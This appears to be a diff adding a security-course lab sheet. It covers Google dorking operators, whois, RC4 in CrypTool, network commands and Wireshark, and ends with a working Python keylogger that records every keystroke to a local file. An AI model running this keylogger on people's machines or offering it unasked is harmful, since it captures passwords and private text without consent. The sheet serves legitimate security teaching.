@@ -1,0 +1,116 @@
+**Practical 1: Google & Whois Reconnaissance**
+
+
+Google Dorking: Use the following operators individually or in combination to gather information:
+
+
+site: - Restrict search to a specific site (e.g., site:example.com)
+
+intitle: - Search for pages with a specific word in the title (e.g., intitle:login)
+
+inurl: - Search for pages with a specific word in the URL (e.g., inurl:admin)
+
+filetype: - Restrict search to specific file types (e.g., filetype:pdf)
+
+intext: - Search for pages containing specific text (e.g., intext:password)
+
+cache: - View cached version of a page (e.g., cache:example.com)
+
+related: - Find similar sites (e.g., related:example.com)
+
+info: - Get information about a site (e.g., info:example.com)
+
+define: - Get definitions (e.g., define:phishing)
+
+allintitle: - All specified words in title (e.g., allintitle:login page)
+
+allinurl: - All specified words in URL (e.g., allinurl:admin panel)
+
+allintext: - All specified words in text (e.g., allintext:secure login)
+
+OR or | - Either search term (e.g., password OR passphrase)
+
+AND - Both search terms (e.g., login AND password - often implied)
+
+- - Exclude a term (e.g., login -example.com)
+
+() - Group terms (e.g., site:example.com (login OR register))
+
+* - Wildcard (e.g., "best * in London")
+
+"search term" - Exact phrase (e.g., "change password")
+
+Whois Lookup: Use whois [domain] to retrieve domain registration information (e.g., whois example.com).
+
+
+
+
+**Practical 2: RC4 Encryption/Decryption (CrypTool)**
+
+
+Open CrypTool.
+
+Create a new file (File -> New).
+
+Enter text.
+
+Encrypt: Encryption/Decryption -> Symmetric(Modern) -> RC4 -> Encrypt.
+
+View encrypted data.
+
+Decrypt: Decrypt button.
+
+
+
+
+**Practical 3: Basic Network Commands**
+
+
+tracert [target] (e.g., tracert google.com)
+Syntax: Tracert [-d] [-h MaxHops] [-w TimeOut] [-4] [-6] target [/?]
+
+ping [target] (e.g., ping google.com)
+Syntax: Ping [-t] [-a] [-n count] [-l size] [-f] [-i TTL] [-v TOS] [-r count] [-s count] [-w timeout] [-R] [ S srcaddr] [-p] [-4] [-6] target [/?]
+
+ipconfig (Windows) or ifconfig (Linux)
+
+netstat
+Syntax: netstat [-a] [-b] [-e] [-f] [-n] [-o] [-p protocol] [-r] [-s] [-t] [-x] [-y] [time_interval] [/?]
+
+arp
+Syntax: arp [-a [InetAddr] [-N IfaceAddr]] [-g [InetAddr] [-N IfaceAddr]] [d InetAddr [IfaceAddr]] [-s InetAddr EtherAddr [IfaceAddr]]
+
+
+
+
+**Practical 5: Network Traffic Capture with Wireshark**
+
+Install Wireshark.
+
+Select the network interface to capture traffic.
+
+Start capture.
+
+Analyze captured packets.
+
+Use filters (e.g., http, tcp.port == 80) to refine the capture.
+
+
+
+
+**Practical 7: Keylogger with Python**
+
+from pynput import keyboard
+
+log_file = "keystrokes.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(log_file, "a") as f:
+            f.write(f" [{key}] ")
+
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
